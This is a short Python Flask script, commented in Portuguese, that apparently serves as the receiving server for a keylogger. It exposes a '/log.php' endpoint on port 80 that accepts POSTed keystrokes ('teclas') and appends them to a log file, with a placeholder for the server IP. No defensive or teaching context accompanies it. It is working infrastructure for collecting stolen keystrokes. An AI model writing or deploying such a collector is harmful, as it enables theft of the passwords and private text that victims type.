from flask import Flask, request

app = Flask(__name__)

@app.route('/log.php', methods=['POST'])
def capturar():
    teclas = request.form.get('teclas')
    with open('log.txt', 'a') as f:
        f.write(teclas + '\n')
    return "Recebido!"

# IP do servidor aqui
app.run(host="0.0.0.0", port=80)
